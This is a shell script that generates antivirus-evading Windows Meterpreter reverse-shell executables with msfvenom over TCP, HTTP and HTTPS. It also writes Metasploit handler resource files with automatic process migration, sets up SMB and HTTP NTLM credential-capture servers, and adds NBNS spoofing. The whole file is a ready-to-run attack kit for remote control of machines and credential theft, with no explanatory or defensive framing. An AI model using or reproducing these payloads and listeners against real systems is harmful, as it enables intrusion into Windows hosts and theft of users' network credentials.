#!/bin/sh
ultimate=/root/Desktop/pentest/av_bypass/ultimate-payload-v0.1/
ipaddr=`ifconfig eth0 | grep 'inet addr:' | cut -d: -f2 | awk '{ print $1}'`
cd $ultimate
msfvenom -p windows/meterpreter/reverse_tcp -f raw LHOST=$ipaddr LPORT=4444 | ./ultimate-payload.pl -t ultimate-payload-template1.exe -o /tftpboot/payload.exe
cp /tftpboot/payload.exe /root/Desktop/metasploit.exe
msfvenom -p windows/meterpreter/reverse_http -f raw LHOST=$ipaddr LPORT=80 | ./ultimate-payload.pl -t ultimate-payload-template1.exe -o /root/Desktop/metasploit_http.exe
msfvenom -p windows/meterpreter/reverse_https -f raw LHOST=$ipaddr LPORT=443 | ./ultimate-payload.pl -t ultimate-payload-template1.exe -o /root/Desktop/metasploit_https.exe
#msfpayload windows/meterpreter/reverse_http LHOST=$ipaddr LPRT=80 V > /root/Desktop/vbs.txt
#sed -i '/Put #/d' /root/Desktop/vbs.txt
# remove the Put #Dgkdk3 line from the vbs.txt
cd -

# set an IP in the modules multi-http.rc and multi-https.rc
echo "use multi/handler" > /root/.msf4/scripts/resource/multi-http.rc
echo "set PAYLOAD windows/meterpreter/reverse_http" >> /root/.msf4/scripts/resource/multi-http.rc
echo "set LPORT 80" >> /root/.msf4/scripts/resource/multi-http.rc
echo "set LHOST $ipaddr" >> /root/.msf4/scripts/resource/multi-http.rc
echo "set ExitOnSession false" >> /root/.msf4/scripts/resource/multi-http.rc
echo "set InitialAutoRunScript \"migrate -f\"" >> /root/.msf4/scripts/resource/multi-http.rc
echo "set SessionCommunicationTimeout 0" >> /root/.msf4/scripts/resource/multi-http.rc
echo "run -j" >> /root/.msf4/scripts/resource/multi-http.rc

echo "use multi/handler" > /root/.msf4/scripts/resource/multi-https.rc
echo "set PAYLOAD windows/meterpreter/reverse_https" >> /root/.msf4/scripts/resource/multi-https.rc
echo "set LPORT 443" >> /root/.msf4/scripts/resource/multi-https.rc
echo "set LHOST $ipaddr" >> /root/.msf4/scripts/resource/multi-https.rc
echo "set ExitOnSession false" >> /root/.msf4/scripts/resource/multi-https.rc
echo "set InitialAutoRunScript \"migrate -f\"" >> /root/.msf4/scripts/resource/multi-https.rc
echo "set SessionCommunicationTimeout 0" >> /root/.msf4/scripts/resource/multi-https.rc
echo "run -j" >> /root/.msf4/scripts/resource/multi-https.rc

echo "use multi/handler" > /root/.msf4/scripts/resource/multi.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /root/.msf4/scripts/resource/multi.rc
echo "set LPORT 4444" >> /root/.msf4/scripts/resource/multi.rc
echo "set LHOST $ipaddr" >> /root/.msf4/scripts/resource/multi.rc
echo "set ExitOnSession false" >> /root/.msf4/scripts/resource/multi.rc
echo "set InitialAutoRunScript \"migrate -f\"" >> /root/.msf4/scripts/resource/multi.rc
echo "set SessionCommunicationTimeout 0" >> /root/.msf4/scripts/resource/multi.rc
echo "run -j" >> /root/.msf4/scripts/resource/multi.rc

echo "use auxiliary/server/capture/smb" >> /root/.msf4/scripts/resource/nbt.rc
echo "set JOHNPWFILE /tmp/johnsmb.txt" >> /root/.msf4/scripts/resource/nbt.rc
echo "set CAINPWFILE /tmp/cainsmb.txt" >> /root/.msf4/scripts/resource/nbt.rc
echo "set SRVHOST $ipaddr" >> /root/.msf4/scripts/resource/nbt.rc
echo "run" >> /root/.msf4/scripts/resource/nbt.rc

echo "use auxiliary/server/capture/http_ntlm" >> /root/.msf4/scripts/resource/nbt.rc
echo "set JOHNPWFILE /tmp/john-http.txt" >> /root/.msf4/scripts/resource/nbt.rc
echo "set CAINPWFILE /tmp/cain-http.txt" >> /root/.msf4/scripts/resource/nbt.rc
echo "set SRVHOST $ipaddr" >> /root/.msf4/scripts/resource/nbt.rc
echo "set SRVPORT 80" >> /root/.msf4/scripts/resource/nbt.rc
echo "set URIPATH / " >> /root/.msf4/scripts/resource/nbt.rc
echo "run" >> /root/.msf4/scripts/resource/nbt.rc

echo "use auxiliary/spoof/nbns/nbns_response" >> /root/.msf4/scripts/resource/nbt.rc
echo "set SPOOFIP $ipaddr" >> /root/.msf4/scripts/resource/nbt.rc
echo "run" >> /root/.msf4/scripts/resource/nbt.rc

